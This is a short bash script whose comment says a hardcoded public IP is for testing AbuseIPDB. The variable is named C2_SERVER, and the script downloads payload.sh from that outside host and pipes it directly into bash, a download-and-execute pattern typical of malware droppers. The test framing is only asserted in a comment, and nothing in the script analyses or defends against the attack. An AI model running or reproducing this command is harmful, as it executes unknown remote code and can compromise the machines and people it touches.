#!/bin/bash
# Hardcoded public IP used for testing AbuseIPDB
C2_SERVER="118.25.6.39"
curl http://$C2_SERVER/payload.sh | bash
